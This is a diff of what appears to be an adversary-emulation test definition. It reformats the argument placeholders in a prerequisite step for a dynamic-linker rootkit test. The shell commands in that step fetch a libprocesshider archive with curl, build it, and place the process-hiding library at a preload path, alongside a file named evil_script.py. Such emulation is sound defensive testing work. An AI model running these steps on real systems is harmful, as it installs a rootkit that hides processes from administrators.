@@ -26,11 +26,13 @@ steps:
     - name: |
         The preload library must exist on disk at specified location (#{library_path})
       inline: |
-        if [ -f {{.Args.library_path}} ]; then exit 0; else  {mkdir -p /tmp/atomic && cd /tmp/atomic
-        curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}
+        if [ -f {{.Args.library_path}} ]; then exit 0; else  {
+        mkdir -p /tmp/atomic && cd /tmp/atomic
+        curl -sLO {{.Args.repo}}/archive/{{.Args.rev}}.zip && unzip {{.Args.rev}}.zip && cd libprocesshider-{{.Args.rev}}
         make
-        cp libprocesshider.so #{library_path}
+        cp libprocesshider.so {{.Args.library_path}}
         cp /usr/bin/ping /usr/local/bin/evil_script.py
+
         } ; fi;
       executor: bash
     - name: dynamic-linker-based-rootkit-(libprocesshider)
